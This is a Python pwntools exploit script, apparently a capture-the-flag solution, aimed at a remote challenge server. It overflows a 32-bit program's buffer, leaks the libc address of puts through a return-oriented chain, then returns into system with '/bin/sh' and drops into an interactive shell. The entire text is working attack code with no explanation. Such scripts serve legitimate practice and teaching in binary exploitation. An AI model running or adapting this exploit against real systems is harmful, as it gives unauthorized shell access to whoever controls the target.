from pwn import *

# p = process('./vuln')
p = remote('binary.challs.pragyanctf.tech', 6001)
e = ELF('./vuln')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

payload = b'A' * 0x34
payload += p32(e.plt['puts'])
payload += p32(e.symbols['main'])
payload += p32(e.got['puts'])
p.sendline(payload)

p.recvuntil(b'Thank you!\n')
libc.address = u64(p.recv(4).ljust(8, b'\x00')) - libc.symbols['puts']
print(hex(libc.address))

payload = b'A' * 0x34
payload += p32(libc.symbols['system'])
payload += b'AAAA'
payload += p32(next(libc.search(b'/bin/sh')))
p.sendline(payload)

p.interactive()
